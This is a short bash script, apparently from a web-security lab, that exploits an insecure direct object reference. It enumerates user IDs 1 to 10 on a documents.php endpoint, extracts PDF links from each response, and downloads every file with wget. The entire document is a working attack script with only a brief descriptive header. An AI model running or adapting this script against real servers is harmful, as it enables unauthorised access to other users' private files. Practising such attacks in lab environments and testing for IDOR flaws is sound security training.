# Description: Enumerates user IDs and downloads exposed PDF files (IDOR scenario)
# Usage: ./idor-file-downloader.sh

#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
